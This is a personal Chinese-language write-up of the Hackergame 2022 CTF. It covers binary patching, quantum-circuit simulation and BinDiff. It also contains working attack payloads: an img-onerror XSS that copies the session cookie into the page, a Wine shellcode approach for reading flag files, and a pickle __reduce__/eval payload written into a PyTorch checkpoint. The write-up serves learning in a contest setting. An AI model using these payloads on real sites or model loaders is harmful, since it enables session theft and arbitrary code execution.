
参加了中国科学技术大学第九届信息安全大赛（即 Hackergame 2022），最终总分 4600，排名 64，排名有点遗憾地没有达到前 50，不过本来我的 CTF 经验也很少，而且，比赛的过程还是很开心的，也学到了很多很有意思的知识。

<info-hint>Hackergame 2022 比赛已于 2022 年 10 月 29 日中午 12:00 正式结束，本文发布于当天晚上，不存在提前公布题解的情况。</info-hint>

# 一些感想

这次给我印象很深的是「杯窗鹅影」和「传达不到的文件」这两题，一个是因为自己平时用 Wine 也挺多的，但是却很少思考 Wine 存在的安全问题。包括我在网上搜集「Wine 如何访问 Linux 根目录」相关资料的时候，也发现很多人其实都是认为删除了 Wine 默认的 ```Z:``` 磁盘映射之后，Wine 运行的程序就无法访问 Linux 根目录了（我自己在做这道题之前也是这样想的）；再比如「传达不到的文件」这一题，即使设置了文件权限，也不代表文件完全处于保护之中，所以这两道题给我的启示就是说计算机安全是没有也不能「想当然」的。可惜的是「传达不到的文件」这题我在比赛时未能想到解题方法。

另外一个给我印象很深的是「evilCallback」这题，V8 是 Chromium 所使用的 JavaScript 引擎，使用的是非常广泛的，并且它的开发者的水平都是非常顶尖的，但是这样的程序也并不是完美的，而计算机安全中任何一个小小的漏洞和疏忽（即使漏洞想要被利用非常困难，但也是有可能的）都有可能导致不良的后果。所以说计算机安全真的是一个很深奥的学问。当然，以我的水平是无法利用「evilCallback」的漏洞的（（

# 部分题目的题解

## Flag 自动机

因为之前没有反汇编相关的经验，所以在这道题上卡了很久。不过事后来看还是不难的。不过因为这是我第一次学习和实践反汇编相关的知识，还取得了成功，所以感觉这道题对我自己还是很有意义的。

首先是「获取 Flag」的按钮在鼠标移上去之后会不断乱动；其次是，即使成功点击了「获取 Flag」的按钮，程序会弹出「你不是本机的超级管理员」的提示，也不会输出 Flag。

---

我首先是用 IDA 看了很久的汇编代码执行流程，然后发现看不太懂。同时，在反汇编后可以注意到程序中包含这样一个字符串：```Hint: You don't need to reverse the encryption itself.```，因此我开始尝试通过修改程序的汇编代码的执行流程来获取 Flag，而不是研究程序的汇编代码执行流程。

因为此前没有反汇编和修改汇编代码的相关经验，所以一开始我并不知道使用什么软件来修改程序的汇编代码。我一开始尝试了原版 Ollydbg 和 Windbg，可是都没怎么用明白。最后换用 LCG 版本的 Ollydbg 来修改汇编代码。我主要使用了两个功能：LCG 版本的 Ollydbg 自带的参考文本字串检索功能，以及分析代码功能，可以让我了解从某个位置到另一位置，中间包含的汇编代码大致都在干些什么。

对于「按钮乱动」的问题，首先搜索字符串「放手离开」，可以找到「获取 Flag 按钮」和「退出程序按钮」这两个按钮的创建流程。考虑到```0040159F```上面的汇编代码看上去像是用来创建「获取 Flag」的按钮，那么也许删去接下来的一些汇编代码就可以解决按钮会乱动的问题。于是凭感觉使用 Ollydbg 将 ```0040159F```到 ```004015FB``` 的汇编代码全部改为 ```nop```，获取 Flag 的按钮就不会乱动了。

对于「无法输出 Flag」的问题，搜索文本「您不是本机的超级管理员」，在这个文本下面的```0040183B```处可以看到一处```jmp```指令，而这个```jmp```指令的下一行就是正常输出 Flag 相关的流程，所以删除掉这处```jmp```即可让程序正常输出 Flag。不过，也可以将```004017FD```到```0040183B```的汇编代码全部改为```nop```，这样那个「您不是本机的超级管理员」的对话框也不会弹出了（不过如果嫌麻烦，只删```0040183B```处的这个```jmp```指令应该也可以）。

---

这道题让我学习了反汇编和修改汇编代码的基本知识，虽然做的时候花了很久的时间，但是事后来看其实是不难的，我花的时间太久，主要还是因为我的经验不足而且操作不熟练。

## 微积分计算小练习

这道题主要是需要注意到```姓名```字段的内容在“练习结果”页面不经任何处理就被加载到结果页面中。而检测练习结果的程序又会在加载结果页面的时候设置会话 Cookie 为 Flag，然后才会输出分数等信息。因此我们可以考虑使用对姓名字段进行一个类似于```XSS```注入的过程，在结果页面加载姓名字段的时候想办法把 Cookie 中的内容放到分数输出里面。然后把得到的结果页面 URL 放到检测练习结果的程序里面，让检测练习结果的程序输出分数的时候输出 Flag。（这段话说起来好像有些绕（（

我使用的是 ```<img>``` 标签的 ```onerror``` 属性进行 XSS。在姓名字段填入如下内容，然后提交后，将结果页面的 URL 提交到那个检测练习结果的程序里即可：

```
<img src="./neko.png" onerror="document.querySelector(`#score`).innerHTML=document.cookie" />
```

## 杯窗鹅影

我参考的文章：[Attacking applications running under WINE (Part I)](https://schlafwandler.github.io/posts/attacking-wine-part-i/)。

从这篇文章中可以知道，我们可以通过 Wine 运行 Linux Shellcode，并且上面的参考文章中已经给出了示例代码，所以直接使用 <https://github.com/schlafwandler/attacking_wine/blob/master/Part_I/exec_shellcode.c> 这里面的代码，将```linux32_printline```中的 Shellcode 替换成读取```/flag1```或```/flag2```的Shellcode然后编译，将编译得到的程序提交即可。

关于如何生成一段 Shellcode，我的方法是，先用 <https://www.exploit-db.com/exploits/44445> 这个 Python2 脚本将 Shell 命令转换成汇编代码，然后使用如下命令生成二进制文件：

```
nasm -f elf64 shell.asm -o shell.o
ld shell.o -o shell
./shell
```

最后用 <https://github.com/tangsilian/SomeCode/tree/master/bin2shellcode> 将二进制文件转换成 ShellCode。

## 量子藏宝图

**第一步：登录进入题目**

首先是要知道 ```BB84``` 加密算法是什么工作的，这里我参考的是<https://zhuanlan.zhihu.com/p/22474140> 这篇知乎文章。

我的做法是：制备基底填写30个字母x（或者全填加号），量子态填写30个0（或者全填1），然后看它给的测量基底和你填写的制备基底有多少个字符是相同的，就填写多少个量子态那里填写的数字，比如如果量子态全填的0，然后测量基底和制备基底有11个字符相同的话，最后那个安全密钥就填写11个数字0。

我的制备基底和量子态的长度都是30个字符长度，因为如果这里的字符长度太小的话，最后它给的测量基底和你填写的制备基底可能只有小于10个字符是相同的，但是那个安全密钥长度应该是必须大于10个字符长度，所以制备基底和量子态的长度不能太短。

**第二步：解出「量子电路图」**

一开始查了一堆乱七八糟的资料试图理解量子电路 ~~，但是可惜的是我实在看不懂~~，不过考虑到题目给了我一个 QISKit 的链接，而 QISKit 又是一个可以基于 Python 的可以用来模拟量子电路的框架，那么，我们能不能使用 QISKit 来模拟它给出的电路图呢？答案是**可以**的。

先导入 QISKit 和其它的一些库，并搭建电路：

```
from qiskit import QuantumCircuit, Aer, execute, transpile;
circ = QuantumCircuit(129,128);
```

然后就是漫长的电路搭建过程，这里给出几行例子：

```
circ.x(128); # 在 q128 处放置那个写着 X 的小方块
circ.h(128); # 在 q128 处放置那个写着 H 的小方块
circ.barrier(); # 创建那个带有灰色背景的竖线虚线，虽然我也不知道那个竖线叫什么（）
circ.cx(0,128); # 在 q0 处创建那个蓝色的最底下有加号的竖线，当然，我也不知道这个竖线叫什么（）
```

电路布置完成后，放置测量器：（至于为什么要放测量器，我参考的是这篇文章：<https://www.qmunity.tech/tutorials/bernstein-vazirani-algorithm> ）

```
for i in range(128):
    circ.measure(i, i)
```

最后编写模拟电路并输出 Flag 的相关代码；

```
sim = Aer.get_backend("aer_simulator");
result = sim.run(circ).result().get_counts();

print(result);
```

注意最后会得到的是二进制的 Flag，按 ASCII 编码进行解读即可得到 Flag。

## 火眼金睛的小 E

第一问就是简简单单的 BinDiff，然后就是第二问了。由于并没有找到使用命令行进行 Bindiff 的方法，也没有找到 Bindiff 有什么其它的接口，因此我只能手动进行 Bindiff 了。因为输入相同的时间戳可以得到相同的题目，因此我们可以先随意填写100次，从而一次获取全部的题目，然后慢慢 Bindiff。时间限制是 60 分钟，这 60 分钟里要完成获取题目、下载需要比较的文件、进行 100 次 BinDiff、提交所有 BinDiff 结果这四个步骤，所以肯定是有一些过程需要自动化的。实际上除了进行 BinDiff 这一步骤之外，获取所有比较题目、提交所有比较结果、每次下载两个bin文件的过程都是可以自动化的， ~~最后练一下手速，争取做到每分钟两次bindiff，基本上就够了。 一开始操作不熟练，再加上很多过程一开始没有自动化，所以浪费了好几个小时。~~ （别学我浪费时间手动 Bindiff（

# 官方题解的一些观后感

## 链上记忆大师

我大概确实是没有完成这道题所需的相关的基础知识，实在想不到 ```Player Bytecode``` 指的是 ```Solidity``` 语言源代码编译之后的字节码qwq

## 二次元神经网络

明明已经想到是利用 Pickle 的反序列化漏洞，也构造出写入那10张图像到 ```result.json``` 的 payload 了，可惜最后仍然没能做出来。对比官方题解，我的问题出在两个地方。

一个是我需要用```torch.save()```来保存```Exploit()```而不能手动写入，否则会提示「在加载和解析模型时出错」。另外一个是我疏忽大意，本来应该将```result.json```保存到```/tmp/```的，但我为了在本地调试方便直接将```result.json```保存到了```infer.py```所在目录。

我的失败的代码如下：（由于篇幅原因，图像的 base64 在此省略）

```
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (eval, ('''open("./result.json", "wb").write(b'{"gen_imgs_b64":[]}')''',),);

attack = Exploit();

attack_payload = pickle.dumps(attack,protocol=0);

attack_payload = attack_payload.decode('UTF-8').strip(".").encode();

with open("./checkpoint/model.pt", "wb") as handler:
    handler.write(attack_payload+b'c__builtin__\neval\np0\n(Vsys.exit()\np1\ntp2\nRp3\n.');

```

# 总结

虽然没有参加过几次 CTF，但是这次 Hackergame 给我感觉还是很有意思的，除了排名止步于 64 名有点遗憾（本来感觉就差一点点就可以排到前 50 名的qwq），明年也许会继续参加。

# 另请参见

* [Hackergame 2022 WriteUp](https://blog.atri.tk/2022/hackergame-2022-writeup/) by [欠陥電気](https://atri.tk/)